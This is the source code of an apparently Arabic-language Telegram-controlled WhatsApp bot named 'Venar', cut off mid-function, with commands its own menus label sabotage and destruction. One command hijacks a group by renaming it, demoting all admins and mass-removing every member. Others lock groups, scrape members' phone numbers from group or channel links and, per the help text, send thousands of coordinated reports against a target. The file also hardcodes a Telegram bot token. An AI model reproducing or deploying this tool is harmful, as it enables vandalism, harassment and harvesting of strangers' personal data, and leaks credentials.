'use strict';

// ===== إجبار الشبكة على استخدام IPv4 =====
const dns = require('dns');
dns.setDefaultResultOrder('ipv4first');

const { Telegraf, Markup } = require('telegraf');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, Browsers, delay } = require('@whiskeysockets/baileys');
const P = require('pino');
const fs = require('fs');
const path = require('path');

const TELEGRAM_TOKEN = '8923729748:AAH2Vp13O760wP7RH82-EHyIQ_2KFNHDjpE';
const REQUIRED_CHANNEL = '-1004235981181'; 
const CHANNEL_INVITE_LINK = 'https://t.me/+JUFIbGRQUZRlNDY0';
const OWNER_TELEGRAM_ID = '7618259702';

const SESSIONS_DIR = path.join(__dirname, 'sessions');
const STATS_DIR = path.join(__dirname, 'stats');
const DATA_DIR = path.join(__dirname, 'data');
const CHANNELS_FILE = path.join(DATA_DIR, 'channels.json');
const ATTEMPTS_FILE = path.join(DATA_DIR, 'attempts.json');
const CHANNEL_LINK = 'https://whatsapp.com/channel/0029Vb9Mw8S7z4kp79ri823E';

const PASSWORD_SECRET = '1q2w3e4r1q2w3e4r';

for (const d of [DATA_DIR, SESSIONS_DIR, STATS_DIR]) {
  if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true });
}

process.on('uncaughtException', function(e) {});
process.on('unhandledRejection', function(r) {});

function loadJSON(f, fb) {
  try { return JSON.parse(fs.readFileSync(f, 'utf-8')); } catch { return fb; }
}
let channels = loadJSON(CHANNELS_FILE, {});
let attemptsData = loadJSON(ATTEMPTS_FILE, {});

function saveChannels() {
  const tmp = CHANNELS_FILE + '.tmp';
  fs.writeFileSync(tmp, JSON.stringify(channels, null, 2));
  fs.renameSync(tmp, CHANNELS_FILE);
}

function loadData() { try { return JSON.parse(fs.readFileSync(path.join(__dirname, 'data.json'), 'utf-8')); } catch (e) { return {}; } }
function saveData(d) { try { fs.writeFileSync(path.join(__dirname, 'data.json'), JSON.stringify(d, null, 2)); } catch (e) { } }

const usersData = loadData();
const sessions = new Map();
const devModeSessions = new Set();
const pendingInput = new Map();
const processedChannels = new Set();
const devGroupActions = new Map(); // لحفظ سياق جروبات المطور للقبول والتعيين

function updateStats(telegramId, kickedCount) {
    const statsFile = path.join(STATS_DIR, 'user_' + telegramId + '.json');
    let stats = { totalHelak: 0, totalKicked: 0 };
    try {
        if (fs.existsSync(statsFile)) stats = JSON.parse(fs.readFileSync(statsFile, 'utf-8'));
    } catch (e) {}
    stats.totalHelak += 1;
    stats.totalKicked += (kickedCount || 0);
    try { fs.writeFileSync(statsFile, JSON.stringify(stats, null, 2)); } catch (e) {}
}

function getUserStats(telegramId) {
    const statsFile = path.join(STATS_DIR, 'user_' + telegramId + '.json');
    try {
        if (fs.existsSync(statsFile)) return JSON.parse(fs.readFileSync(statsFile, 'utf-8'));
    } catch (e) {}
    return { totalHelak: 0, totalKicked: 0 };
}

function getQuickImage() {
    try {
        const extPath = '/sdcard/MyBot/image.jpg';
        const locPath = path.join(__dirname, 'image.jpg');
        if (fs.existsSync(extPath)) return fs.readFileSync(extPath);
        if (fs.existsSync(locPath)) return fs.readFileSync(locPath);
    } catch (e) {}
    return null;
}

function extractInviteCode(link) {
    if (!link) return null;
    let match = link.match(/whatsapp\.com\/(?:channel|join|chat)\/([a-zA-Z0-9_-]+)/);
    return match ? match[1] : null;
}

async function checkSubscription(botInstance, userId) {
    try {
        const member = await botInstance.telegram.getChatMember(REQUIRED_CHANNEL, userId);
        const status = member.status;
        if (status === 'member' || status === 'administrator' || status === 'creator') {
            return true;
        }
    } catch (e) {}
    return false;
}

async function enrichChannel(sock, jid) {
  try {
    const meta = await sock.newsletterMetadata('jid', jid);
    if (!meta) return;
    const tm = meta.thread_metadata || meta;
    const name = tm.name?.text || meta.name || 'بدون اسم';
    const inviteCode = meta.invite || tm.invite?.code || tm.invite_code || null;

    channels[jid] = {
      jid,
      name,
      type: 'channel',
      link: inviteCode ? 'https://whatsapp.com/channel/' + inviteCode : null,
      subscribers: tm.subscribers_count ?? meta.subscribers ?? null,
      capturedAt: channels[jid]?.capturedAt || Date.now(),
      updatedAt: Date.now(),
    };
    saveChannels();
  } catch {}
}

async function connectWhatsApp(telegramId, phoneNumber, bot) {
    const sessionDir = path.join(SESSIONS_DIR, 'user_' + telegramId);
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    
    const sock = makeWASocket({
        auth: state,
        logger: P({ level: 'silent' }),
        printQRInTerminal: false,
        browser: Browsers.macOS('Chrome'),
        syncFullHistory: false,
        markOnlineOnConnect: true,
        connectTimeoutMs: 120000,
        defaultQueryTimeoutMs: 120000,
        keepAliveIntervalMs: 15000,
        retryRequestDelayMs: 200,
        shouldSyncHistoryMessage: function() { return false; }
    });

    sessions.set(telegramId, { 
        sock: sock, 
        phone: phoneNumber, 
        status: 'connecting', 
        reconnectAttempts: 0,
        contacts: {},
        channelsCache: [],
        groupsCache: []
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('contacts.upsert', function(contacts) {
        const s = sessions.get(telegramId);
        if (!s) return;
        for (let i = 0; i < contacts.length; i++) {
            let c = contacts[i];
            if (c.id && (c.name || c.notify)) {
                s.contacts[c.id] = c.name || c.notify;
            }
        }
    });

    sock.ev.on('messages.upsert', async function(update) {
        const messages = update.messages;
        const type = update.type;
        
        for (const msg of messages) {
            const jid = msg?.key?.remoteJid;
            if (jid && jid.endsWith('@newsletter')) {
                if (!channels[jid]?.name && !processedChannels.has(jid)) {
                    processedChannels.add(jid);
                    await enrichChannel(sock, jid);
                }
            }
        }

        if (type !== 'notify') return;
        
        const msg = messages.get ? messages.get(0) : messages[0];
        if (!msg || !msg.message) return;
        
        const remoteJid = msg.key.remoteJid;
        const isGroup = remoteJid.endsWith('@g.us');
        const text = msg.message.conversation || (msg.message.extendedTextMessage ? msg.message.extendedTextMessage.text : '') || '';
        
        usersData[telegramId] = usersData[telegramId] || {};
        const uData = usersData[telegramId];
        const userPhone = uData.phone || '';
        const senderJid = msg.key.participant || remoteJid;
        const isMyMessage = msg.key.fromMe || (userPhone && senderJid.includes(userPhone));

        if (isGroup && uData.autoReactEnabled && uData.reactEmoji && !isMyMessage) {
            let shouldReact = false;
            if (uData.reactMode === 'all') {
                shouldReact = true;
            } else if (uData.reactMode === 'custom' && uData.allowedGroups && uData.allowedGroups.length > 0) {
                if (uData.allowedGroups.includes(remoteJid)) {
                    shouldReact = true;
                }
            }

            if (shouldReact) {
                try {
                    const groupMeta = await sock.groupMetadata(remoteJid).catch(() => null);
                    if (groupMeta && groupMeta.participants) {
                        const participant = groupMeta.participants.find(p => p.id === senderJid);
                        if (participant && (participant.admin === 'admin' || participant.admin === 'superadmin')) {
                            await sock.sendMessage(remoteJid, { react: { text: uData.reactEmoji, key: msg.key } }).catch(() => {});
                        }
                    }
                } catch (e) {}
            }
        }

        if (!text) return;

        if (uData.mode === 'وحدي' && !isMyMessage) return;
        if (!isMyMessage && uData.mode !== 'الكل' && uData.mode !== 'وحدي') {
            if (!isMyMessage) return;
        }

        if (!text.startsWith('.')) return;

        const args = text.slice(1).trim().split(/\s+/);
        const command = args.shift().toLowerCase();
        const paramArg = args.join(' ').trim();

        if (command === 'الكل') {
            uData.mode = 'الكل';
            saveData(usersData);
            await sock.sendMessage(remoteJid, { text: '✅ *تم تفعيل البوت للجميع في المجموعات.*' }, { quoted: msg });
        }
        else if (command === 'وحدي') {
            uData.mode = 'وحدي';
            saveData(usersData);
            await sock.sendMessage(remoteJid, { text: '🔒 *تم قصر استخدام البوت عليك وحدك.*' }, { quoted: msg });
        }
        else if (command === 'أدخل') {
            if (!paramArg) {
                await sock.sendMessage(remoteJid, { text: '⚠️ *خطأ:* يرجى كتابة الإيموجي.\n📌 الاستخدام: `.أدخل 🗿`' }, { quoted: msg });
                return;
            }
            uData.reactEmoji = paramArg;
            saveData(usersData);
            await sock.sendMessage(remoteJid, { text: `✅ *تم حفظ الإيموجي بنجاح:* ${paramArg}` }, { quoted: msg });
        }
        else if (command === 'تفاعل') {
            const subCmd = args[0] ? args[0].toLowerCase() : '';
            if (subCmd === 'تشغيل' || subCmd === 'on') {
                uData.autoReactEnabled = true;
                uData.reactMode = 'all';
                saveData(usersData);
                await sock.sendMessage(remoteJid, { text: '🟢 *تم تفعيل التفاعل التلقائي لرسائل المشرفين في كل الجروبات.*' }, { quoted: msg });
            } else if (subCmd === 'إيقاف' || subCmd === 'off') {
                uData.autoReactEnabled = false;
                saveData(usersData);
                await sock.sendMessage(remoteJid, { text: '🔴 *تم إيقاف ميزة التفاعل التلقائي.*' }, { quoted: msg });
            } else {
                await sock.sendMessage(remoteJid, { text: '⚠️ الاستخدام الصحيح:\n- `.تفاعل تشغيل`\n- `.تفاعل إيقاف`' }, { quoted: msg });
            }
        }
        else if (command === 'سحب' || command === 'sahib') {
            if (isGroup) {
                try {
                    const groupMeta = await sock.groupMetadata(remoteJid);
                    const participants = groupMeta.participants || [];
                    const botId = sock.user?.id ? sock.user.id.split(':')[0] : '';
                    
                    // البحث عن المشرفين (ما عدا البوت والمستخدم نفسه صاحب الجلسة)
                    const admins = participants.filter(p => p.admin && !p.id.includes(botId) && !p.id.includes(phoneNumber));

                    if (admins.length === 0) {
                        const msgText = '*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n`You are the only admin here`\n*⎈━━═☾• ❮❄️❯ •☽═━━⎈*';
                        await sock.sendMessage(remoteJid, { text: msgText }, { quoted: msg });
                    } else {
                        const msgText = '*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n`There are admins here. Do you want to remove all of them? Yes / No`\n*⎈━━═☾• ❮❄️❯ •☽═━━⎈*';
                        uData.pendingSahibGroup = remoteJid;
                        saveData(usersData);
                        await sock.sendMessage(remoteJid, { text: msgText }, { quoted: msg });
                    }
                } catch (e) {
                    await sock.sendMessage(remoteJid, { text: '❌ Failed to check group admins.' }, { quoted: msg });
                }
            } else {
                await sock.sendMessage(remoteJid, { text: '⚠️ *خطأ:* أمر سحب مخصص للمجموعات فقط.' }, { quoted: msg });
            }
        }
        else if (text.toLowerCase() === 'yes' && uData.pendingSahibGroup === remoteJid) {
            uData.pendingSahibGroup = null;
            saveData(usersData);
            await sock.sendMessage(remoteJid, { text: '⚡ *Processing withdrawal of all admins...*' });
            try {
                const groupMeta = await sock.groupMetadata(remoteJid);
                const botId = sock.user?.id ? sock.user.id.split(':')[0] : '';
                const admins = groupMeta.participants.filter(p => p.admin && !p.id.includes(botId) && !p.id.includes(phoneNumber));
                let demoteList = admins.map(p => p.id);
                if (demoteList.length > 0) {
                    await sock.groupParticipantsUpdate(remoteJid, demoteList, 'demote');
                    await sock.sendMessage(remoteJid, { text: '✅ *All admins have been successfully removed.*' });
                } else {
                    await sock.sendMessage(remoteJid, { text: 'ℹ️ *No regular admins to demote.*' });
                }
            } catch (e) {
                await sock.sendMessage(remoteJid, { text: '❌ *Failed to execute withdrawal.*' });
            }
        }
        else if (text.toLowerCase() === 'no' && uData.pendingSahibGroup === remoteJid) {
            uData.pendingSahibGroup = null;
            saveData(usersData);
            await sock.sendMessage(remoteJid, { text: '❌ *Operation cancelled.*' });
        }
        else if (command === 'شرح') {
            if (!paramArg) {
                await sock.sendMessage(remoteJid, { text: '📌 *أمر الشرح:* اكتب اسم الأمر بعد الشرح لمعرفة وظيفته.\n💡 مثال: `.شرح death` أو `.شرح هلاك`' }, { quoted: msg });
                return;
            }
            let exp = '';
            const cmdName = paramArg.replace('.', '').toLowerCase();
            switch (cmdName) {
                case 'menu': case 'اوامر': exp = 'عرض القائمة الرئيسية للأوامر وتصنيفاتها المزخرفة.'; break;
                case 'زرف': exp = 'عرض قائمة أوامر الزرف التدميرية.'; break;
                case 'تخريب': exp = 'عرض قائمة أوامر التخريب والهجوم.'; break;
                case 'جانبية': case 'اوامر جانبية': exp = 'عرض أوامر الأدوات الجانبية والإضافية.'; break;
                case 'هلاك': case 'zarf': exp = 'سحق وتدمير الجروب وتغيير الاسم والوصف وتنزيل المشرفين وطرد الجميع.'; break;
                case 'طرد': exp = 'طرد عضو محدد عبر عمل منشن له.'; break;
                case 'status': case 'حالة': exp = 'عرض تفصيلي لحالة اتصال البوت والإحصائيات.'; break;
                case 'delay': exp = 'ضبط وتحديد سرعة التأخير للإجراءات.'; break;
                case 'channels': exp = 'عرض القنوات المؤرشفة المرقمة.'; break;
                case 'groups': exp = 'عرض قائمة الجروبات المرقمة.'; break;
                case 'info': exp = 'جلب معلومات مفصلة عن رابط قناة أو مجموعة.'; break;
                case 'سحب': exp = 'سحب وفحص صلاحيات المشرفين والمؤسس في المجموعة.'; break;
                case 'death': case 'ابلاغ': exp = 'إرسال 5000 بلاغ مكثف ومنسق على الهدف المحدد.'; break;
                case 'الكل': exp = 'السماح للجميع باستخدام البوت، أو تفعيل التفاعل العام.'; break;
                case 'وحدي': exp = 'قصر استخدام البوت عليك وحدك.'; break;
                case 'قتل': exp = 'قفل وتأمين الجروب بالكامل.'; break;
                case 'استخراج': exp = 'استخراج وفهرسة جميع أرقام المشرفين والأعضاء من جروب أو قناة محددة.'; break;
                case 'أدخل': exp = 'تحديد الإيموجي الذي سيستخدمه البوت للتفاعل.'; break;
                case 'تفاعل': exp = 'تشغيل أو إيقاف التفاعل التلقائي على محتوى المشرفين.'; break;
                default: exp = '❌ هذا الأمر غير موجود أو غير مسجل في قائمة الشرح.'; break;
            }
            await sock.sendMessage(remoteJid, { text: `📖 *شرح الأمر (${paramArg}):*\n${exp}` }, { quoted: msg });
        }
        else if (command === 'channels' || command === 'قنوات') {
            const items = Object.values(channels).filter(c => c.type === 'channel' || !c.type);
            if (!items.length) {
                await sock.sendMessage(remoteJid, { text: '📭 *خطأ:* لا توجد قنوات مسجلة بعد.' }, { quoted: msg });
                return;
            }
            let response = '*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n📺 *قائمة القنوات المرقمة:*\n*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n\n';
            uData.cachedChannels = items;
            for (let i = 0; i < items.length; i++) {
                response += `${i + 1}.${items[i].name}\n`;
            }
            await sock.sendMessage(remoteJid, { text: response }, { quoted: msg });
        } 
        else if (command === 'groups' || command === 'جروبات') {
            try {
                const groupsObj = await sock.groupFetchAllParticipating();
                const groupList = Object.values(groupsObj || {});
                if (groupList.length === 0) {
                    await sock.sendMessage(remoteJid, { text: '📁 *خطأ:* لا توجد أي جروبات.' }, { quoted: msg });
                    return;
                }
                let response = '*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n📁 *قائمة الجروبات المرقمة:*\n*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n\n';
                uData.cachedGroups = groupList;
                
                for (let i = 0; i < groupList.length; i++) {
                    response += `${i + 1}.${groupList[i].subject || 'بدون اسم'}\n`;
                }
                await sock.sendMessage(remoteJid, { text: response }, { quoted: msg });
            } catch (e) {
                await sock.sendMessage(remoteJid, { text: '❌ *خطأ تقني:* فشل جلب المجموعات.' }, { quoted: msg });
            }
        } 
        else if (command === 'استخراج') {
            if (!paramArg) {
                await sock.sendMessage(remoteJid, { text: '⚠️ *خطأ:* يرجى تحديد الهدف.\n📌 الاستخدام: `.استخراج [الرابط أو الرقم]`' }, { quoted: msg });
                return;
            }

            let targetJid = paramArg.trim();
            const indexNum = parseInt(paramArg) - 1;
            const cachedGrps = uData.cachedGroups || [];
            const cachedChans = uData.cachedChannels || [];

            if (!isNaN(indexNum)) {
                if (cachedGrps[indexNum]) {
                    targetJid = cachedGrps[indexNum].id;
                } else if (cachedChans[indexNum]) {
                    targetJid = cachedChans[indexNum].jid;
                }
            } else {
                if (!targetJid.includes('@')) {
                    let cleanNum = targetJid.replace(/[^0-9]/g, '');
                    targetJid = cleanNum + '@s.whatsapp.net';
                }
                const code = extractInviteCode(paramArg);
                if (code && paramArg.includes('/channel/')) {
                    const nInfo = await sock.newsletterMetadata('invite', code).catch(() => null);
                    if (nInfo && nInfo.id) targetJid = nInfo.id;
                } else if (code) {
                    const gInfo = await sock.groupGetInviteInfo(code).catch(() => null);
                    if (gInfo && gInfo.id) targetJid = gInfo.id;
                }
            }

            await sock.sendMessage(remoteJid, { text: '🔍 *جاري استخراج وفهرسة الأرقام...* ⏳' }, { quoted: msg });

            try {
                if (targetJid.endsWith('@g.us')) {
                    const groupMeta = await sock.groupMetadata(targetJid);
                    const participants = groupMeta.participants || [];
                    
                    let adminsList = '👑 *قائمة المشرفين:*\n';
                    let membersList = '👥 *قائمة الأعضاء العاديين:*\n';
                    let adminCount = 0;
                    let memberCount = 0;

                    for (let p of participants) {
                        let num = p.id.split('@')[0];
                        if (p.admin === 'admin' || p.admin === 'superadmin') {
                            adminCount++;
                            adminsList += `${adminCount}. +${num} (${p.admin === 'superadmin' ? 'مشرف أساسي' : 'مشرف'})\n`;
                        } else {
                            memberCount++;
                            membersList += `${memberCount}. +${num}\n`;
                        }
                    }

                    let fullReport = '*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n' +
                                     `📊 *نتيجة استخراج أرقام الجروب (${groupMeta.subject || 'بدون اسم'}):*\n` +
                                     '*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n\n' +
                                     `📌 إجمالي المشرفين: ${adminCount}\n` +
                                     `📌 إجمالي الأعضاء: ${memberCount}\n\n` +
                                     adminsList + '\n*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n' + membersList;

                    await sock.sendMessage(remoteJid, { text: fullReport }, { quoted: msg });
                } else if (targetJid.endsWith('@newsletter')) {
                    const newsletterMeta = await sock.newsletterMetadata('jid', targetJid).catch(() => null);
                    let subCount = newsletterMeta?.subscribersCount || 'غير متاح';
                    await sock.sendMessage(remoteJid, { text: `📺 *معلومات القناة:*\n📌 عدد المتابعين: ${subCount}` }, { quoted: msg });
                } else {
                    await sock.sendMessage(remoteJid, { text: '❌ *خطأ:* الهدف المحدد غير صالح.' }, { quoted: msg });
                }
            } catch (e) {
                await sock.sendMessage(remoteJid, { text: '❌ *فشل الاستخراج.*' }, { quoted: msg });
            }
        }
        else if (command === 'قتل') {
            if (isGroup) {
                await sock.sendMessage(remoteJid, { text: '🚨 *جاري قفل وتأمين الجروب بالكامل...* ⚡' }, { quoted: msg });
                try {
                    await sock.groupSettingUpdate(remoteJid, 'announcement');
                    await sock.sendMessage(remoteJid, { text: '✅ *تم قفل الجروب وإغلاقه بنجاح.*' });
                } catch (e) {
                    await sock.sendMessage(remoteJid, { text: '❌ *فشل قفل الجروب.*' });
                }
            } else {
                await sock.sendMessage(remoteJid, { text: '⚠️ أمر قتل مخصص للمجموعات فقط.' }, { quoted: msg });
            }
        }
        else if (command === 'menu' || command === 'اوامر') {
            await sock.sendMessage(remoteJid, { delete: msg.key }).catch(() => {});
            sendWhatsAppMainCategoryMenu(sock, remoteJid, msg);
        }
        else if (command === 'زرف') {
            await sock.sendMessage(remoteJid, { delete: msg.key }).catch(() => {});
            sendWhatsAppZarfMenu(sock, remoteJid, msg);
        }
        else if (command === 'تخريب') {
            await sock.sendMessage(remoteJid, { delete: msg.key }).catch(() => {});
            sendWhatsAppTakhreebMenu(sock, remoteJid, msg);
        }
        else if (command === 'جانبية' || command === 'اوامر جانبية') {
            await sock.sendMessage(remoteJid, { delete: msg.key }).catch(() => {});
            sendWhatsAppSideMenu(sock, remoteJid, msg);
        }
        else if (command === 'هلاك' || command === 'zarf') {
            if (isGroup) {
                sock.sendMessage(remoteJid, { react: { text: "😈", key: msg.key } }).catch(function(){});
                executeFullHelak(sock, remoteJid, args, telegramId, msg, senderJid);
            } else {
                await sock.sendMessage(remoteJid, { text: '⚠️ *خطأ:* أمر هلاك يعمل داخل المجموعات فقط.' }, { quoted: msg });
            }
        } 
        else if (command === 'طرد' || command === 'طرظ') {
            if (isGroup) {
                sock.sendMessage(remoteJid, { react: { text: "👢", key: msg.key } }).catch(function(){});
                executeKick(sock, remoteJid, args, msg);
            } else {
                await sock.sendMessage(remoteJid, { text: '⚠️ *خطأ:* أمر طرد مخصص للمجموعات فقط.' }, { quoted: msg });
            }
        } 
        else if (command === 'delay' || command === 'تأخير') {
            if (args[0]) {
                const delayVal = args[0];
                uData.delayConfig = delayVal;
                saveData(usersData);
                await sock.sendMessage(remoteJid, { text: `⏱️ *تم ضبط سرعة التأخير إلى:* ${delayVal} ثانية.` }, { quoted: msg });
            } else {
                const currentDelay = uData.delayConfig || '1';
                await sock.sendMessage(remoteJid, { text: `⏱️ *التأخير الحالي المحدد:* ${currentDelay} ثانية.` }, { quoted: msg });
            }
        } 
        else if (command === 'status' || command === 'حالة') {
            sendBotDetailedStatus(sock, remoteJid, telegramId, msg);
        } 
    });

    sock.ev.on('connection.update', async function(u) {
        const { connection, lastDisconnect, qr } = u;
        const s = sessions.get(telegramId);
        if (!s) return;

        if (qr && !sock.authState.creds.registered && phoneNumber) {
            try {
                await delay(300);
                const code = await sock.requestPairingCode(phoneNumber);
                const fmt = code?.match(/.{1,4}/g)?.join('-') || code;
                await bot.telegram.sendMessage(telegramId, '🔑 كود الربط السريع:\n\n`' + fmt + '`', { parse_mode: 'Markdown' });
            } catch (e) {}
        }

        if (connection === 'open') {
            if (s.status !== 'connected') {
                s.status = 'connected'; 
                s.reconnectAttempts = 0;
                usersData[telegramId] = usersData[telegramId] || {};
                usersData[telegramId].phone = phoneNumber;
                usersData[telegramId].registered = true;
                saveData(usersData);
                
                const welcomeText = '✨ *Welcome to Venar Bot* ✨\n\n📊 WhatsApp Status: 🟢 Connected\n\n👉 Please click on Link WhatsApp to start using the bot on WhatsApp.';
                await bot.telegram.sendMessage(telegramId, welcomeText, { parse_mode: 'Markdown', ...getInlineMenu() });
            }
        }

        if (connection === 'close') {
            s.status = 'disconnected';
            const code = lastDisconnect?.error?.output?.statusCode;
            if (code === DisconnectReason.loggedOut || code === 401 || code === 403) {
                sessions.delete(telegramId);
                if (usersData[telegramId]) { usersData[telegramId].registered = false; saveData(usersData); }
                return;
            }
            s.reconnectAttempts = (s.reconnectAttempts || 0) + 1;
            if (s.reconnectAttempts > 15) { sessions.delete(telegramId); return; }
            setTimeout(function() { connectWhatsApp(telegramId, phoneNumber, bot).catch(function(){}); }, 3000);
        }
    });
    return sock;
}

function sendWhatsAppMainCategoryMenu(sock, targetJid, msg) {
    const menuMessage = '║   🔥 𝑉𝐸𝑁𝐴𝑅 𝑆𝑌𝑆𝑇𝐸𝑀 𝑀𝐸𝑁𝑈 🔥\n' +
                        '*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n\n' +
                        '*[ اوامر الزرف ]*\n' +
                        '> .زرف\n' +
                        '*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n\n' +
                        '*[ اوامر التخريب ]*\n' +
                        '> .تخريب\n' +
                        '*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n\n' +
                        '*[ اوامر جانبية ]*\n' +
                        '> .جانبية\n' +
                        '*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n\n' +
                        '*.شرح [ اي امر موجود بالقائمة]*';
    sock.sendMessage(targetJid, { text: menuMessage }, { quoted: msg }).catch(function(){});
}

function sendWhatsAppZarfMenu(sock, targetJid, msg) {
    const menuMessage = '║   🔥 𝑉𝐸𝑁𝐴𝑅 𝑆𝑌𝑆𝑇𝐸𝑀 𝑀𝐸𝑁𝑈 🔥\n' +
                        '*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n' +
                        '*[ اوامر الزرف ]*\n\n' +
                        '* *menu*\n' +
                        '* *هلاك / zarf*\n' +
                        '* *طرد*\n' +
                        '* *سحب*\n' +
                        '* *حالة/status*\n' +
                        '* *delay [ثانية]*\n' +
                        '*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n' +
                        '*.شرح [ اي امر موجود بالقائمة]*';
    sock.sendMessage(targetJid, { text: menuMessage }, { quoted: msg }).catch(function(){});
}

function sendWhatsAppTakhreebMenu(sock, targetJid, msg) {
    const menuMessage = '║   🔥 𝑉𝐸𝑁𝐴𝑅 𝑆𝑌𝑆𝑇𝐸𝑀 𝑀𝐸𝑁𝑈 🔥\n' +
                        '*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n' +
                        '  *[ اوامر التخريب ]*\n\n' +
                        '* *.channels*\n' +
                        '* *.groups*\n' +
                        '* *.info [رابط]*\n' +
                        '* *.death [رابط/رقم]*\n' +
                        '* *.الكل / .وحدي*\n' +
                        '* *.قتل*\n' +
                        '* *.استخراج [رابط/رقم]*\n' +
                        '*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n' +
                        '*.شرح [ اي امر موجود بالقائمة]*';
    sock.sendMessage(targetJid, { text: menuMessage }, { quoted: msg }).catch(function(){});
}

function sendWhatsAppSideMenu(sock, targetJid, msg) {
    const menuMessage = '║   🔥 𝑉𝐸𝑁𝐴𝑅 𝑆𝑌𝑆𝑇𝐸𝑀 𝑀𝐸𝑁𝑈 🔥\n' +
                        '*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n' +
                        '  [ *اوامر جانبية* ]\n\n' +
                        '* *.أدخل [إيموجي]*\n' +
                        '* *.تفاعل تشغيل / إيقاف*\n' +
                        '* *.خاص_تفاعل_تشغيل [رقم الجروب أو أرقام مفصولة بشرطة]*\n' +
                        '*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n' +
                        '*.شرح [ اي امر موجود بالقائمة]*';
    sock.sendMessage(targetJid, { text: menuMessage }, { quoted: msg }).catch(function(){});
}

function sendBotDetailedStatus(sock, targetJid, telegramId, msg) {
    const s = sessions.get(telegramId);
    const stats = getUserStats(telegramId);
    const u = usersData[telegramId] || {};
    const statusText = (s && s.status === 'connected') ? '✅ متصل ومستقر' : '❌ غير متصل';
    
    const statusReport = '*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n' +
                         '📊 *تقرير حالة البوت التفصيلية:*\n' +
                         '*⎈━━═☾• ❮❄️❯ •☽═━━⎈*\n\n' +
                         `• حالة واتساب: ${statusText}\n` +
                         `• الرقم المربوط: ${u.phone ? '+' + u.phone : 'غير مربوط'}\n` +
                         `• إجمالي الهلاك المحفوظ: ${stats.totalHelak}\n` +
                         `• إجمالي الأعضاء المطردين: ${stats.totalKicked}\n\n` +
                         '*⎈━━═☾• ❮❄️❯ •☽═━━⎈*';

    sock.sendMessage(targetJid, { text: statusReport }, { quoted: msg }).catch(function(){});
}

async function executeFullHelak(sock, groupJid, args, telegramId, msg, senderJid) {
    try {
        const u = usersData[telegramId] || {};
        const customName = u.name || 'مزروف Venar';
        const customDesc = u.desc || 'تم سحقكم من قبل Venar';
        const customMsg = u.msg || 'تم سحق الجروب بنجاح!';
        let meta = await sock.groupMetadata(groupJid);
        const rawBotId = sock.user && sock.user.id ? sock.user.id : '';
        const cleanBotNumber = rawBotId.split(':')[0].split('@')[0];
        const cleanUserNumber = senderJid ? senderJid.split(':')[0].split('@')[0] : '';

        const img = getQuickImage();
        let kickedCount = 0;

        const instantActions = [
            sock.groupUpdateSubject(groupJid, customName).catch(function(){}),
            sock.groupUpdateDescription(groupJid, customDesc).catch(function(){})
        ];
        if (img) instantActions.push(sock.updateProfilePicture(groupJid, img).catch(function(){}));
        await Promise.all(instantActions);

        await sock.sendMessage(groupJid, { text: customMsg });
        if (img) {
            await sock.sendMessage(groupJid, { image: img, caption: '🔗 رابط القناة:\n' + CHANNEL_LINK }, { quoted: msg });
        } else {
            await sock.sendMessage(groupJid, { text: '🔗 رابط القناة:\n' + CHANNEL_LINK }, { quoted: msg });
        }

        let admins = meta.participants.filter(p => p.admin && !p.id.includes(cleanBotNumber) && !p.id.includes(cleanUserNumber));
        for (let i = 0; i < admins.length; i++) {
            await sock.groupParticipantsUpdate(groupJid, [admins[i].id], 'demote').catch(function(){});
            kickedCount++;
        }

        let normalMembers = meta.participants
            .filter(p => !p.admin && !p.id.includes(cleanBotNumber) && !p.id.includes(cleanUserNumber))
            .map(p => p.id);

        if (normalMembers.length > 0) {
            for (let i = 0; i < normalMembers.length; i += 10) {
                let batch = normalMembers.slice(i, i + 10);
                await sock.groupParticipantsUpdate(groupJid, batch, 'remove').catch(function(){});
                kickedCount += batch.length;
                await delay(200);
            }
        }

        updateStats(telegramId, kickedCount);
    } catch (e) {}
}

async function executeKick(sock, groupJid, args, msg) {
    try {
        const extText = msg.message.extendedTextMessage;
        const mentioned = extText && extText.contextInfo && extText.contextInfo.mentionedJid ? extText.contextInfo.mentionedJid : [];
        if (mentioned.length > 0) {
            await sock.groupParticipantsUpdate(groupJid, mentioned, 'remove');
            sock.sendMessage(groupJid, { text: '✅ تم طرد العضو بنجاح 🥂.' }, { quoted: msg }).catch(function(){});
        } else {
            sock.sendMessage(groupJid, { text: '⚠️ *خطأ:* يجب عمل إشارة (منشن) للعضو.' }, { quoted: msg }).catch(function(){});
        }
    } catch (e) {}
}

// ===== تيليجرام =====
const bot = new Telegraf(TELEGRAM_TOKEN);

bot.telegram.setMyCommands([
    { command: 'menu', description: 'قائمة الأوامر الرئيسية' },
    { command: 'link', description: 'ربط واتساب' },
    { command: 'status', description: 'الحالة والإحصائيات' },
    { command: 'logout', description: 'فصل الجلسة' },
    { command: 'health', description: 'فحص النظام' }
]).catch(function(){});

function getInlineMenu() {
    return Markup.inlineKeyboard([
        [Markup.button.callback('🔗 ربط واتساب', 'btn_link')],
        [Markup.button.callback('📝 تغيير الوصف', 'btn_desc'), Markup.button.callback('✏️ تغيير اسم الجروب', 'btn_name')],
        [Markup.button.callback('💬 تغيير رسالة الهلاك', 'btn_msg')],
        [Markup.button.callback('📊 الحالة', 'btn_status'), Markup.button.callback('🩺 صحة النظام', 'btn_health')],
